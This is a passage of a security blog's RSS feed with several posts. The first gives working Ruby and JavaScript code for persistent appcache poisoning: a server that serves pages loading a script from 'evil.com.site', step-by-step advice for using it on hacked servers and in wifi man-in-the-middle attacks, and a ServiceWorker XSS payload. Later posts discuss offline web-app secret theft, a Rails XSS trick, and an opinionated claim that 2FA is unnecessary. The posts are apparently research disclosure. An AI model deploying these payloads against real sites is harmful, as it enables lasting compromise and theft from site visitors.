+  &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://www.google.ru/search?q=site%3A'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;amp;oq=site%3Asakurity.com&amp;amp;aqs=chrome..69i57j69i58.2444j0j9&amp;amp;sourceid=chrome&amp;amp;es_sm=91&amp;amp;ie=UTF-8&amp;amp;start=10&amp;amp;num=100&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;scan&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/http:\/\/&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;(.*?)[&amp;amp;%]/im&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;flatten&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;uniq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;get_pages&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sakurity.com'&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Don’t forget user specific URLs such as “/settings” or “/homakov/direct_messages”. You can generate the manifest on the fly.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Insert your middlekit in front of the hacked production server. For demonstration you can run following script locally and add &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1 sakurity.com&lt;/code&gt; to your &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;. &lt;strong&gt;It also works in MitM attacks over wifi against https:// websites.&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'sinatra'&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;wire&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:utm_medium&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;real content&quot;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTML&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
+&amp;lt;html manifest='/a.appcache'&amp;gt;
+&amp;lt;script src=&quot;https://evil.com.site/middlekit.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+&amp;lt;script&amp;gt;
+function load(url){
+x=new XMLHttpRequest;
+x.open('get',url);
+
+x.setRequestHeader('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8');
+x.setRequestHeader('Cache-Control','max-age=0');
+x.setRequestHeader('Upgrade-Insecure-Requests','1');
+x.send();
+
+x.onreadystatechange=function(){
+  if(x.readyState==4){
+    document.write(x.responseText);
+    //document.body.parentElement.innerHTML = x.responseText;
+  }
+}
+}
+if(location.href.indexOf(&quot;?&quot;) != -1){
+
+  var u = location.href + &quot;&amp;amp;utm_medium=1&quot;;
+}else{
+  var u = location.href + &quot;?utm_medium=1&quot;;
+}
+//history.pushState(&quot;&quot;,&quot;&quot;,url);
+console.log(&quot;Infected&quot;)
+load(u);
+&amp;lt;/script&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HTML&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;pages&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;%w{/ /reconnect /lengthextension /logindemo /peatio.pdf /stealtitle /blog/2015/03/15/authy_bypass.html /blog/2015/03/03/duo_format_injection.html /blog/2015/07/28/appcache.html /blog/2015/03/10/Profilejacking.html /blog/2015/06/04/mongo_ruby_regexp.html /blog/2015/05/08/pusher.html /blog/2015/03/04/hybrid_api_auth.html /blog/2015/03/27/slack_or_reset_token_hashing.html /blog/2015/07/18/2fa.html /blog/2015/05/21/starbucks.html /blog/2015/03/05/RECONNECT.html /blog/2014/01/01/puzzle1.html /blog/2015/04/10/email_password_manager.html /blog/2015/02/28/openuri.html /blog/2015/06/25/puzzle2.html /blog/2015/01/22/peatio-audit.html /blog/2015/01/10/hacking-bitcoin-exchanger.html /triple}&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;pages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wire&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/a.appcache'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cache-control'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'max-age=3155760000'&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'content-type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'text/cache-manifest; charset=UTF-8'&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;CACHE MANIFEST
+/a.appcache
+&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Get as many users as possible to visit the hacked server right now - try a newsletter.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Now all of them load your middlekit.html first, and there is no way to destroy appcache with javascript. The admins have to ask every user to visit chrome://appcache-internals/ manually&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;serviceworker&quot;&gt;&lt;a href=&quot;https://www.html5rocks.com/en/tutorials/service-worker/introduction/&quot;&gt;ServiceWorker&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;This one works only in Chrome on desktop and only over https: websites, but is actually much more dangerous. It creates a worker which alters responses for all requests and there’s no need to explicitly cache every page - you can cover entire domain with one worker.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;n&quot;&gt;onfetch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;respondWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;headers: &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:'text/html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}))&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;To install a ServiceWorker the browser wants to see it as a response with &lt;code class=&quot;highlighter-rouge&quot;&gt;content-type:text/javascript&lt;/code&gt;. Pinky, are you pondering what I’m pondering?&lt;/p&gt;
+
+&lt;p&gt;Lots of JSONP endpoints respond with arbitrary JS. For instance &lt;a href=&quot;https://gist.github.com/homakov/0ff5711729a14fb50b3f&quot;&gt;look at my challenge&lt;/a&gt;, this is &lt;a href=&quot;https://clientsit.herokuapp.com/xss?user=%3Cscript%3E%0Anavigator.serviceWorker.register(%22%2Fjsonp%3Fcallback%3Donfetch%253Dfunction(e)%257B%250Ae.respondWith(new%2520Response(%27%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E%27%252C%257Bheaders%253A%2520%257B%27Content-Type%27%253A%27text%252Fhtml%27%257D%257D))%250A%257D%252F%252F%22).then(function(registration)%20%7B%0A%20%20console.log(%27ServiceWorker%20registration%20successful%20with%20scope%3A%20%27%2C%20%20%20%20registration.scope)%3B%0A%7D).catch(function(err)%20%7B%0A%20%20console.log(%27ServiceWorker%20registration%20failed%3A%20%27%2C%20err)%3B%0A%7D)%3B%0A%3C%2Fscript%3E&quot;&gt;the answer&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In other words &lt;strong&gt;XSS + JSONP + ServiceWorker = Permanent XSS on every page&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;recap&quot;&gt;Recap&lt;/h2&gt;
+
+&lt;p&gt;Appcache is too late to fix, and it’s going to be perfect cache poisoning tool for a long while for both hacked websites and insecure connections (yet another reason to avoid https:// when you’re on someone’s wifi).&lt;/p&gt;
+
+&lt;p&gt;ServiceWorker is very young and powerful technology, and should be implemented more carefully, taking into account how common JSONP endpoints are. I believe it was a bad idea to allow any text/javascript responses to become a ServiceWorker. At least it should be an extra header &lt;code class=&quot;highlighter-rouge&quot;&gt;Service-Worker:true&lt;/code&gt; or explicit &lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Type:text/javascript-serviceworker&lt;/code&gt;.&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 13 Aug 2015 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2015/08/13/middlekit.html</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2015/08/13/middlekit.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Let's make Offline Web Applications secure!</title>
+        <description>&lt;h2 id=&quot;the-goal&quot;&gt;The Goal&lt;/h2&gt;
+
+&lt;p&gt;We want more offline web applications. A ToDo app, a Bitcoin wallet, a password manager - Javascript can easily handle these tasks. For starters, &lt;strong&gt;this is why I hate desktop applications&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;I have no idea what those shady binaries are going to do with my computer. In other words I don’t want to install anything on my computer.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Those apps are large (e.g. Multibit wallet is 34 MB), require manual download, manual installation, manual removal of app.exe/app.dmg file and manual uninstallation.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Speaking of usability, it’s obvious web apps are superior to desktop apps : &lt;strong&gt;you type wallet.com and it just works&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Speaking of security, web apps are &lt;strong&gt;way more superior&lt;/strong&gt;: it runs in a sandbox, explicitly asks for access to your web cam/location/local files, and uses a scripting language that almost any programmer can read and audit.&lt;/p&gt;
+
+&lt;p&gt;Speaking of performance and heavy video games, yes, WebAssembly isn’t there yet. But let’s focus on simple apps like bitcoin wallet.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTML/Using_the_application_cache&quot;&gt;Appcache&lt;/a&gt; is an HTML5 technique to make applications work offline, without any requests to the server.&lt;/p&gt;
+
+&lt;p&gt;Here is &lt;a href=&quot;https://gist.github.com/homakov/6ce6bbb54ab4b558c05b&quot;&gt;Proof of concept&lt;/a&gt; - after first encounter with the app it sits in your browser, permanently cached. You can embed public keys of the developers to allow manual updates and require signatures for every update (code sign) like @substack’s &lt;a href=&quot;https://hyperboot.org/&quot;&gt;Hyperboot&lt;/a&gt; offers.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;But there’s one thing why I will never use existing web apps for critical tasks.&lt;/strong&gt; Because web apps are “backdoored” out-of-box by the maintainer.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-problem&quot;&gt;The Problem&lt;/h2&gt;
+&lt;p&gt;If the app is hacked/the maintainer is forced by government to steal your secrets (namely content of localStorage) they can trivially make victim’s user-agent visit uncached and therefore loaded from the server &lt;code class=&quot;highlighter-rouge&quot;&gt;https://wallet.com/hacked_page&lt;/code&gt; with JS code stealing sensitive localStorage.&lt;/p&gt;
+
+&lt;p&gt;By the way all existing “we keep private key in your browser blah-blah” Bitcoin wallets are vulnerable to this. As long as you don’t download the wallet and run it under file:/// protocol (not a “web” wallet anymore, huh?), they can easily steal your Bitcoins with simple Javascript code served from same origin.&lt;/p&gt;
+
+&lt;p&gt;Here is the result of my brainstorm trying to solve this.&lt;/p&gt;
+
+&lt;p&gt;1) Always require passphrase to decrypt localStorage?&lt;/p&gt;
+
+&lt;p&gt;This will require malicious page to create a link with the app via &lt;code class=&quot;highlighter-rouge&quot;&gt;x=window.open('/');waitForPassphrase();alert(x.passphrase);&lt;/code&gt; (which can be detected) or via more sophisticated link &lt;code class=&quot;highlighter-rouge&quot;&gt;x=window.open('/hacked_page_spying_on_opener');location='/'&lt;/code&gt; which cannot be detected (a window doesn’t know if it opened other windows and therefore can be accessed from them).&lt;/p&gt;
+
+&lt;p&gt;Same origin policy is our ubiquitous enemy. On top of that typing complex passphrase every time is inconvenient.&lt;/p&gt;
+
+&lt;p&gt;2) &lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Security-Policy: sandbox&lt;/code&gt; to prevent cross-page access?&lt;/p&gt;
+
+&lt;p&gt;Would be cool, it’s the feature I used in &lt;a href=&quot;https://homakov.blogspot.ru/2013/02/pagebox-website-gatekeeper.html&quot;&gt;Pagebox&lt;/a&gt;. Unfortunatelly localStorage isn’t going to work: &lt;code class=&quot;highlighter-rouge&quot;&gt;Uncaught SecurityError: Failed to read the 'localStorage' property from 'Window': The document is sandboxed and lacks the 'allow-same-origin' flag.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;3) Ask users to add &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1 wallet.com&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; after first load&lt;/p&gt;
+
+&lt;p&gt;Don’t be so sceptical, it’s not that hard.&lt;/p&gt;
+
+&lt;p&gt;4) Use path-specific cookie for storing passphrase&lt;/p&gt;
+
+&lt;p&gt;Take a deep breath: ugly design of cookies is finally useful! We can ask the user to use &lt;code class=&quot;highlighter-rouge&quot;&gt;wallet.com/s3cr3tpage&lt;/code&gt; which stores encryption_key for localStorage in a path specific cookie: &lt;code class=&quot;highlighter-rouge&quot;&gt;document.cookie='key=secret;path=/s3cr3tpage;';&lt;/code&gt; The only way to access decrypted content of localStorage is to know the &lt;code class=&quot;highlighter-rouge&quot;&gt;/s3cr3tpage&lt;/code&gt; part storing the encryption key.&lt;/p&gt;
+
+&lt;p&gt;Weird trick, but seems to be working.&lt;/p&gt;
+
+&lt;p&gt;5) Like previous one but more reliable&lt;/p&gt;
+
+&lt;p&gt;Wildcard subdomains. Secrets of an app served from s3cr3tsub.wallet.com can never be hijacked with same origin attacks as long as the attackers don’t know what &lt;code class=&quot;highlighter-rouge&quot;&gt;s3cr3tsub&lt;/code&gt; you’re using. Demo coming soon.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-solution&quot;&gt;The Solution&lt;/h2&gt;
+
+&lt;p&gt;As far as I know there’s no way to develop a Secure Offline Web Application without path-based cookies (4) or random subdomains (5) which are super ugly.&lt;/p&gt;
+
+&lt;p&gt;Therefore we need Appcache to have one simple option: “never load any URL from the server like we’re forever offline”. This will cut off all possible vectors and malicious maintainer will not be able to abuse same origin policy to access our secrets. I believe this feature can revolutionize the world of web applications.&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 28 Jul 2015 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2015/07/28/appcache.html</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2015/07/28/appcache.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Why You Don't Need 2 Factor Authentication</title>
+        <description>&lt;p&gt;TL;DR because 2FA == password manager.&lt;/p&gt;
+
+&lt;p&gt;2FA, as many other things in infosec, is full of myths and stereotypes. I stumbled upon this link where &lt;a href=&quot;https://bitbucket.org/site/master/issues/5811/support-two-factor-authentication-bb-7016&quot;&gt;lots of people demand bitbucket to add 2FA.&lt;/a&gt; For what? Let’s talk about some myths of 2FA.&lt;/p&gt;
+
+&lt;h2 id=&quot;myth-1-what-you-know-what-you-have-blah-blah&quot;&gt;Myth 1. What you “know”, what you “have”, blah blah&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Multi-factor_authentication&quot;&gt;Wikipedia page about multi factor auth&lt;/a&gt;. There are no “knowledge” and “inherence” factors, there’s only possession factor. You possess a password by having it in your neurons (or whatever used for memory), you also possess your fingerprints (fingers happen to be attached to your body since you were born).&lt;/p&gt;
+
+&lt;p&gt;Therefore there are no “3 categories” that can be used for authentication, there is unlimited number of factors with different “features”. Let’s mention some of them:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Password - stored in your memory, easy to forget, often reused, often not complex enough. A human being can only remember few dozens of complex enough passwords.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Hardware token - stored in your backpack, not hard to lose or break, almost impossible to backup.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Fingerprint - &lt;a href=&quot;https://blog.dustinkirkland.com/2013/10/fingerprints-are-user-names-not.html&quot;&gt;is username, not password&lt;/a&gt;. Should never be used in remote systems like web apps. Refrain from using it in physical access systems too - in near future faking perfect fingerprints is more likely than mind stealing your passwords.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;SMS/Email code - here you have to rely on few other guys in the middle who possess your codes as much as you do - telecoms and email providers. Codes sent by SMS (&lt;a href=&quot;https://sakurity.com/blog/2015/03/15/authy_bypass.html&quot;&gt;like Authy&lt;/a&gt;) are not 2FA, it’s 2 step verification, pretty much pointless and expensive.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Whitelisted IP address - trustworthy, but beware of CSRF requests and DNS rebinding attacks.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;to be continued&lt;/p&gt;
+
+&lt;h2 id=&quot;myth-2-2fa-makes-my-account-more-secure-with-no-strings-attached&quot;&gt;Myth 2. 2FA makes my account more secure with no strings attached&lt;/h2&gt;
+
+&lt;p&gt;Technically it does because it adds extra authentication step but you don’t see the big picture yet:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;It requires you to type a code every time and wastes your time&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;If you lose HOTP seed it is up to admins to give you second chance to access your account&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Doesn’t stop malware and viruses - &lt;a href=&quot;https://www.schneier.com/blog/archives/2005/03/the_failure_of.html&quot;&gt;Schneier wrote extremely good insight back in 2005&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Major design mistake - TOTP authenticators generate just 6 digits - &lt;a href=&quot;https://sakurity.com/otp&quot;&gt;OTP bruteforce&lt;/a&gt; works like a charm and takes less than 3 days. On top of that 30 seconds limit is quite silly - it doesn’t make bruteforce any harder - just do the math and you will see.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;There’s no way to stop bruteforce not locking the account&lt;/strong&gt;. The real user will be locked out as well, and it’s again up to admins if they decide to spend their time on your ID verification. Good HOTP should have bruteforce “protection” out-of-box, 6 letters [a-zA-Z0-9] give 56800235584 combinations and require &lt;strong&gt;hunders of years&lt;/strong&gt; of bruteforce.&lt;/p&gt;
+
+&lt;h2 id=&quot;recap-read-this-before-commenting-ok&quot;&gt;Recap (read this before commenting, ok?)&lt;/h2&gt;
+
+&lt;p&gt;A 2FA app is essentially a password manager. A 2FA seed/code is essentially a password. &lt;strong&gt;“Time-based” thing does not add any security&lt;/strong&gt;, and 6-digits thing makes security even worse. &lt;strong&gt;2FA is obscure, inconvenient, hard to backup, bruteforce-able password manager.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;You don’t need 2FA, all you need is a unique complex password and a password manager.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;There’s no plausible attack scenario where simple password + 2FA is better than good complex password alone&lt;/strong&gt;. Why?&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;If the attackers managed to infect your computer with malware, they can wait a couple of days until you type a valid OTP code. “Be hacked right away” vs “be hacked next week” is not major  advantage. Out-of-band 2FA is another story though and I didn’t see it implemented properly anywhere.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;If the attackers hack your email box, now they can set a new password, indeed. This could be mitigated with some “Never remind me password” option - stop asking Bitbucket and others to implement 2FA, better ask them to add such option.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Thanks Chrome, this is the future:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/2fachrome.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tweet &lt;a href=&quot;https://twitter.com/homakov&quot;&gt;@homakov&lt;/a&gt; to tell how wrong I am.&lt;/p&gt;
+
+&lt;p&gt;P.S. 2FA comes in handy if you know your support guys (likely) use bad passwords and “You must set 2FA” is just another way to say “You must use a password manager”.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 18 Jul 2015 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2015/07/18/2fa.html</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2015/07/18/2fa.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Puzzle #2: Really Curious XSS in Rails</title>
+        <description>&lt;p&gt;I’ve seen this code quite a few times in app/views: &lt;code class=&quot;highlighter-rouge&quot;&gt;$.get(location.pathname+'?something')&lt;/code&gt;. It reads current pathname and requests it with some parameters or loads some extra JSON data. Or adjusts search filters. Lots of use cases. 100% innocent code, isn’t it?&lt;/p&gt;
+
+&lt;p&gt;No! location.pathname is considered harmful in Rails! Say, we have /customsearch endpoint.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Rails doesn’t care about extra ‘/’ in the path and strips it. That’s why   https://host.com//customsearch works. Thanks Rails!&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;//customsearch&lt;/code&gt; is a path-relative URL and will turn this AJAX request into a cross domain request. Yes it was a bad idea to make &lt;code class=&quot;highlighter-rouge&quot;&gt;//&lt;/code&gt; path relative directive. They should have created &lt;code class=&quot;highlighter-rouge&quot;&gt;rel://&lt;/code&gt; path instead for this purpose, would fix a lot of security issues with redirects. Thanks web standards!&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;While buying 1st level “customsearch” domain is unfeasible there are tons of other cheap domains like &lt;code class=&quot;highlighter-rouge&quot;&gt;customsearch.space&lt;/code&gt;, thanks to new affordable TLDs!&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;https://host.com//customsearch.space will also work because the “.space” part is recognized as params[:format] of the request. Thanks Rails!&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Now when jQuery makes a cross domain request to our //customsearch.space we can simply return JS code with content type = text/javascript and &lt;a href=&quot;https://github.com/jquery/jquery/issues/2432&quot;&gt;it will be automatically executed by jQuery&lt;/a&gt;. Thanks jQuery!&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;This is not a super common bug but I like how couple of Rails “features” turned an absolutely innocent line of code into XSS.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 25 Jun 2015 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2015/06/25/puzzle2.html</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2015/06/25/puzzle2.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Mongo BSON Injection: Ruby Regexps Strike Again</title>
